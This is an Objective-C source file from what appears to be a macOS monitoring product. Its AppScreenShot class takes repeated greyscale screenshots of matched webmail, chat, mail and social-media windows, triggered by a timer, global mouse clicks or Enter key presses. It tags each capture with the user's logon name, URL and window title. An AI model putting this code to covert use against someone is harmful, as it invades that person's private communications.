//
//  AppScreenShot.m
//  AppScreenShotManager
//
//  Created by ophat on 4/1/16.
//  Copyright (c) 2016 ophat. All rights reserved.
//

#import "AppScreenShot.h"
#import "AppScreenRule.h"

#import "PageInfo.h"
#import "PageVisitedNotifier.h"
#import "SystemUtilsImpl.h"
#import "ImageUtils.h"

#import "FxAppScreenShotEvent.h"
#import "DateTimeFormat.h"
#import "DefStd.h"

NSString * kAppScreenShotSafariBundleID         = @"com.apple.Safari";
NSString * kAppScreenShotFirefoxBundleID        = @"org.mozilla.firefox";
NSString * kAppScreenShotGoogleChromeBundleID   = @"com.google.Chrome";

const int kAppDeactive      = 0;
const int kAppActive        = 1;
const int kAppChangeTitle   = 2;
const int kAppTerminate     = 3;

@implementation AppScreenShot

@synthesize mSavePath;
@synthesize mSnapShotTimer;
@synthesize mSnapAppID, mSnapAppName, mSnapAppUrl, mSnapAppTitle, mSnapAppType;
@synthesize mSnapRuleTitle, mSnapRuleUrl;
@synthesize mCurrentRule;
@synthesize mMouseEventHandler, mKeyEventHandler;
@synthesize mThread;
@synthesize mDelegate,mSelector;

- (instancetype) init {
    if (self = [super init]) {
        mRules = [[NSMutableArray alloc] init];
        mListOfApplication = [[NSMutableArray alloc] init];
        mPageNotifier = [[PageVisitedNotifier alloc] initWithPageVisitedDelegate:self];
        mPageNotifier.mCheckUrlTitle = NO;
    }
    return self;
}

- (void) startCapture {
    DLog(@"#### AppScreenShot startCapture");
    if ([mRules count] > 0) {
        [self registerNotification];
    } else{
        DLog(@"No Rule No Go");
    }
}

- (void) stopCapture {
    DLog(@"#### AppScreenShot stopCapture");
    [self unregisterNotification];
    
    [self unregisterTriggerRule];
    
    [self clearRules];
}

- (void) addRule:(AppScreenRule *) aRule {
    [mListOfApplication addObject:[aRule mApplicationID]];
    [mRules addObject:aRule];
}

- (void) clearRules {
    self.mSnapRuleTitle = nil;
    self.mSnapRuleUrl   = nil;
    
    [mListOfApplication removeAllObjects];
    [mRules removeAllObjects];
}

#pragma mark - Delegate

- (void) pageVisited:(PageInfo *) aPageVisited {
    [self validateToSnapForPage:aPageVisited];
}

- (void) registerNotification {
    [self unregisterNotification];

    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(appNotifyCaseActive:)  name:NSWorkspaceDidActivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(appNotifyCaseDeactive:)  name:NSWorkspaceDidDeactivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(appNotifyCaseLaunch:)  name:NSWorkspaceDidLaunchApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(appNotifyCaseTerminate:)  name:NSWorkspaceDidTerminateApplicationNotification  object:nil];
    
    [mPageNotifier startNotify];
}

- (void) unregisterNotification {
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidActivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidDeactivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidLaunchApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidTerminateApplicationNotification object:nil];
    
    [mPageNotifier stopNotify];
}

- (void) appNotifyCaseLaunch:(NSNotification *) notification {
    // DO NOTHING
}

- (void) appNotifyCaseActive:(NSNotification *) notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication * runningapp = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    
    if ([[runningapp bundleIdentifier] isEqualToString:kAppScreenShotSafariBundleID] ||
        [[runningapp bundleIdentifier] isEqualToString:kAppScreenShotGoogleChromeBundleID] ||
        [[runningapp bundleIdentifier] isEqualToString:kAppScreenShotFirefoxBundleID]) {
        //
    } else {
        PageInfo *page = [[[PageInfo alloc] init] autorelease];
        page.mApplicationID = runningapp.bundleIdentifier;
        page.mApplicationName = runningapp.localizedName;
        page.mUrl = nil;
        page.mTitle = [self getTitleOfWindowFromAppID:page.mApplicationID];
        page.mPID = runningapp.processIdentifier; // Do not rely on this PID, from documents it can be -1
        
        [self pageVisited:page];
    }
}

- (void) appNotifyCaseDeactive:(NSNotification *) notification {
    [self pageVisited:nil];
}

- (void) appNotifyCaseTerminate:(NSNotification *) notification {
    [self pageVisited:nil];
}

- (NSString *) getTitleOfWindowFromAppID:(NSString *) aAppID {
    NSRunningApplication *rApp = [[NSRunningApplication runningApplicationsWithBundleIdentifier:aAppID] firstObject];
    return [SystemUtilsImpl frontApplicationWindowTitleWithPID:[NSNumber numberWithInt:rApp.processIdentifier]];
}

- (void) validateToSnapForPage:(PageInfo *) aPage {
    DLog(@"aPage : %@", aPage);
    if (aPage) {
        NSString * appTitle = aPage.mTitle;
        NSString * appID    = aPage.mApplicationID;
        NSString * appName  = aPage.mApplicationName;
        NSString * url      = aPage.mUrl;
        
        self.mCurrentRule = nil;
        
        BOOL noRuleMatched = YES;
        
        if ([mListOfApplication containsObject:aPage.mApplicationID]) {
            NSMutableArray *matchedRules = [NSMutableArray arrayWithCapacity:1];
            for (AppScreenRule *r in mRules) {
                if ([[r mApplicationID] isEqualToString:appID]) {
                    [matchedRules addObject:r];
                }
            }
            DLog(@"Matched rules (by app) : %@", matchedRules);
            
            for (AppScreenRule *rule in matchedRules) {
                if (rule.mAppType == kBrowser) { // Rule for browser
                    DLog(@"### Browser");
                    for (AppScreenParameter *parameter in rule.mParameter) {
                        if (parameter.mDomainName && [url rangeOfString:parameter.mDomainName].location != NSNotFound) { // Url
                            noRuleMatched = NO;
                            self.mCurrentRule = rule;
                            
                            DLog(@"Match url");
                            
                            self.mSnapRuleTitle = nil;
                            self.mSnapRuleUrl   = parameter.mDomainName;
                            
                            break; // Parameter loop
                        }
                        else { // Title
                            for (NSString *title in parameter.mTitles) {
                                if ([appTitle rangeOfString:title].location != NSNotFound) {
                                    noRuleMatched = NO;
                                    self.mCurrentRule = rule;
                                    
                                    DLog(@"Match title");
                                    
                                    self.mSnapRuleTitle = title;
                                    self.mSnapRuleUrl = nil;
                                    
                                    break; // Title loop
                                }
                            }
                            
                            if (noRuleMatched == NO) {
                                break; // Parameter loop
                            }
                        }
                    }
                    
                    if (noRuleMatched == NO) {
                        break; // Rule loop
                    }
                }
                else if (rule.mAppType == kNon_Browser) { // Rule for non-browser
                    DLog(@"### Non-Browser");
                    for (AppScreenParameter *parameter in rule.mParameter) {
                        for (NSString *title in parameter.mTitles) { // Only title
                            if ([appTitle rangeOfString:title].location != NSNotFound) {
                                noRuleMatched = NO;
                                self.mCurrentRule = rule;
                                
                                DLog(@"Match title");
                                
                                self.mSnapRuleTitle = title;
                                self.mSnapRuleUrl = nil;
                                
                                break; // Title loop
                            }
                        }
                        
                        if (noRuleMatched == NO) {
                            break; // Parameter loop
                        }
                    }
                    
                    if (noRuleMatched == NO) {
                        break; // Rule loop
                    }
                }
            }
        }
        
        if (noRuleMatched) {
            DLog(@"No match, end snap for, app: %@, url : %@, title : %@", appID, url, appTitle);
            self.mCurrentRule = nil;
            
            [self unregisterTriggerRule];
            
            self.mSnapAppID    = nil;
            self.mSnapAppName  = nil;
            self.mSnapAppTitle = nil;
            self.mSnapAppUrl   = nil;
            self.mSnapAppType  = kNon_Browser;
            
            self.mSnapRuleTitle = nil;
            self.mSnapRuleUrl   = nil;
        }
        else {
            self.mSnapAppID    = appID;
            self.mSnapAppName  = appName;
            self.mSnapAppTitle = appTitle;
            self.mSnapAppUrl   = url;
            self.mSnapAppType = (self.mCurrentRule.mAppType == kBrowser) ? kBrowser : kNon_Browser;
            
            [self unregisterTriggerRule];
            [self registerTriggerRule:self.mCurrentRule page:aPage];
        }
    }
    else {
        DLog(@"Deactivate or terminate, end snap for, app: %@", self.mSnapAppID);
        
        self.mCurrentRule = nil;
        
        [self unregisterTriggerRule];
        
        self.mSnapAppID    = nil;
        self.mSnapAppName  = nil;
        self.mSnapAppTitle = nil;
        self.mSnapAppUrl   = nil;
        self.mSnapAppType  = kNon_Browser;
        
        self.mSnapRuleTitle = nil;
        self.mSnapRuleUrl   = nil;
    }
}

- (void) registerTriggerRule: (AppScreenRule *) aRule page: (PageInfo *) aPage {
    AppScreenRule *rule = aRule;
    DLog(@"Snap every %d second(s), left : %d, right : %d, enter : %d", rule.mFrequency, (rule.mMouse & kMouseClick_Left), (rule.mMouse & kMouseClick_Right), (rule.mKey & kKeyPress_Enter));
    
    if (rule.mFrequency > 0) {
        self.mSnapShotTimer = [NSTimer scheduledTimerWithTimeInterval:rule.mFrequency target:self selector:@selector(snapAndSend:) userInfo:aPage repeats:YES];
        [self.mSnapShotTimer fire]; // Yolo Start
    }
    
    if (rule.mMouse != kMouseCick_None) {
        if (self.mMouseEventHandler == nil) {
            NSEventMask eventMask = NSLeftMouseDownMask;
            if (rule.mMouse & kMouseClick_Right) {
                eventMask = NSRightMouseDownMask;
            }
            if ((rule.mMouse & kMouseClick_Left) && (rule.mMouse & kMouseClick_Right)) {
                eventMask = NSLeftMouseDownMask|NSRightMouseDownMask;
            }
            
            self.mMouseEventHandler = [NSEvent addGlobalMonitorForEventsMatchingMask:eventMask handler:^(NSEvent *mouseEvent) {
                [self snapAndSend:aPage];
            }];
        }
    }
    
    if (rule.mKey != kKeyPress_None) {
        if (self.mKeyEventHandler == nil) {
            self.mKeyEventHandler = [NSEvent addGlobalMonitorForEventsMatchingMask:NSKeyDownMask handler:^(NSEvent *keyEvent) {
                NSString *eventChars = [keyEvent characters];
                unichar keyChar = [eventChars characterAtIndex:0];
                if (keyChar == NSEnterCharacter ||
                    keyChar == NSCarriageReturnCharacter) {
                    [self snapAndSend:aPage];
                }
            }];
        }
    }
}

- (void) unregisterTriggerRule {
    if (self.mSnapShotTimer) {
        [self.mSnapShotTimer invalidate];
        self.mSnapShotTimer = nil;
    }
    
    if (self.mMouseEventHandler) {
        [NSEvent removeMonitor:self.mMouseEventHandler];
        self.mMouseEventHandler = nil;
    }
    
    if (self.mKeyEventHandler) {
        [NSEvent removeMonitor:self.mKeyEventHandler];
        self.mKeyEventHandler = nil;
    }
}

- (void) snapAndSend: (PageInfo *) aPage {
    NSRunningApplication *frontmostApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
    
    if ([frontmostApp.bundleIdentifier isEqualToString:@"com.apple.loginwindow"] ||
        [frontmostApp.bundleIdentifier isEqualToString:@"com.apple.ScreenSaver.Engine"]) {
        return ;
    }
    
    if ([self.mDelegate respondsToSelector:self.mSelector] && [frontmostApp.bundleIdentifier isEqualToString:self.mSnapAppID]) {
        
        /*
         For situation where user switch tabs (e.g: Chrome) but the notification did not trigger so application takes screenshot of wrong widnow like url is gmail but screenshot is redmine
         */
        
        bool nothingChange = true;
        if (self.mSnapRuleTitle) {
            // Match by title thus compare title again
            NSString *title = [self getTitleOfWindowFromAppID:self.mSnapAppID];
            if ([title rangeOfString:self.mSnapAppTitle].location == NSNotFound) {
                nothingChange = false;
            } else {
                // Nothing change or something change but title remain matched, update title to reflect the screenshot
                self.mSnapAppTitle = title;
            }
        }
        
        if (self.mSnapRuleUrl) {
            // Match by url so compare url again but url always get latest one from PageNotifier
        }
        
        if (nothingChange) {
            AppScreenRule *rule = self.mCurrentRule; // Capture pointer before it may change...
            dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
                NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
                
                //NSImage *screenshot = [SystemUtilsImpl takeScreenshotFrontWindowWithBundleIDUsingAppleScript:self.mSnapAppID];
                //NSImage *screenshot = [SystemUtilsImpl takeFocusedWindowShotWithBundleID:self.mSnapAppID];
                NSImage *screenshot = [SystemUtilsImpl takeAllWindowsShotWithBundleID:self.mSnapAppID];
                DLog(@"Color screenshot : %@", screenshot);
                
                //NSSize reSize = NSMakeSize(850.0f,850.0f);
                //screenshot = [ImageUtils scaleImage:screenshot toSize:reSize];
                screenshot = [ImageUtils imageToGreyImage:screenshot];
                if (screenshot) {
                    NSData *tiffData = [screenshot TIFFRepresentation];
                    NSBitmapImageRep *bitmap = [NSBitmapImageRep imageRepWithData:tiffData];
                    [bitmap setSize:[screenshot size]];
                    NSDictionary *imageProps = [NSDictionary dictionaryWithObject:@1.0 forKey:NSImageCompressionFactor];
                    NSData *pngData = [bitmap representationUsingType:NSPNGFileType properties:imageProps];
                    NSString *savePath = [NSString stringWithFormat:@"%@%@-%@.png",self.mSavePath,[[NSUUID UUID] UUIDString],[NSDate date]];
                    
                    if (pngData.length > 0 && [pngData writeToFile:savePath atomically:YES]) {
                        FxAppScreenShotEvent *ASSEvent = [[FxAppScreenShotEvent alloc] init];
                        [ASSEvent setDateTime:[DateTimeFormat phoenixDateTime]];
                        [ASSEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
                        [ASSEvent setMApplicationID:self.mSnapAppID];
                        [ASSEvent setMApplicationName:self.mSnapAppName];
                        [ASSEvent setMTitle:self.mSnapAppTitle];
                        [ASSEvent setMApplication_Catagory:self.mSnapAppType];
                        [ASSEvent setMUrl:self.mSnapAppUrl];
                        [ASSEvent setMScreenshotFilePath:savePath];
                        
                        // App type
                        if (rule.mAppType == kNon_Browser) {
                            ASSEvent.mApplication_Catagory = kAppScreenShotNon_Browser;
                        } else {
                            ASSEvent.mApplication_Catagory = kAppScreenShotBrowser;
                        }
                        
                        // Screenshot category
                        if (rule.mScreenshotType == kScreenshotTypeWebmail) {
                            ASSEvent.mScreenshot_Category = kAppScreenShotWebMail;
                        } else if (rule.mScreenshotType == kScreenshotTypeMailApp) {
                            ASSEvent.mScreenshot_Category = kAppScreenShotMailApp;
                        } else if (rule.mScreenshotType == kScreenshotTypeWebChat) {
                            ASSEvent.mScreenshot_Category = kAppScreenShotWebChat;
                        } else if (rule.mScreenshotType == kScreenshotTypeChatApp) {
                            ASSEvent.mScreenshot_Category = kAppScreenShotChatApp;
                        } else if (rule.mScreenshotType == kScreenshotTypeSocialMedia) {
                            ASSEvent.mScreenshot_Category = kAppScreenShotSocialMedia;
                        }
                        /*
                        DLog(@"===================== snapAndSend =======================");
                        DLog(@"dateTime: %@", [ASSEvent dateTime]);
                        DLog(@"mUserLogonName: %@", [ASSEvent mUserLogonName]);
                        DLog(@"mApplicationID: %@", [ASSEvent mApplicationID]);
                        DLog(@"mApplicationName: %@", [ASSEvent mApplicationName]);
                        DLog(@"mTitle: %@", [ASSEvent mTitle]);
                        DLog(@"mApplication_Catagory ID: %d", (int)[ASSEvent mApplication_Catagory]);
                        DLog(@"mUrl: %@", [ASSEvent mUrl]);
                        DLog(@"mScreenshotFilePath: %@", [ASSEvent mScreenshotFilePath]);
                        DLog(@"===================== snapAndSend =======================");*/
                        
                        // ID, Name, Title, Url could reset in another thread (main) so make sure some of these contain value by checking only ID
                        if (ASSEvent.mApplicationID != nil) {
                            [mDelegate performSelector:self.mSelector onThread:self.mThread withObject:ASSEvent waitUntilDone:NO];
                        }
                        [ASSEvent release];
                    } else {
                        DLog(@"Grey screenshot  : %@", screenshot);
                        DLog(@"tiffData         : %lu", (unsigned long)tiffData.length);
                        DLog(@"bitmap           : %@", bitmap);
                        DLog(@"pngData          : %lu", (unsigned long)pngData.length);
                        DLog(@"Cannot convert AppScreenShot to png or save to file");
                    }
                } else {
                    DLog(@"No Send :> CANNOT take screenshot self.mSnapAppID : %@", self.mSnapAppID);
                }
                
                [pool release];
            });
        }
    }
}

-(void) dealloc{
    [self stopCapture];
    [self unregisterTriggerRule];
    
    [mPageNotifier release];
    
    [mSavePath release];
    [mListOfApplication release];
    [mRules release];
    
    [mSnapAppID release];
    [mSnapAppName release];
    [mSnapAppTitle release];
    [mSnapAppUrl release];
    
    [mSnapRuleTitle release];
    [mSnapRuleUrl release];
    
    [mCurrentRule release];
    
    [super dealloc];
}

@end
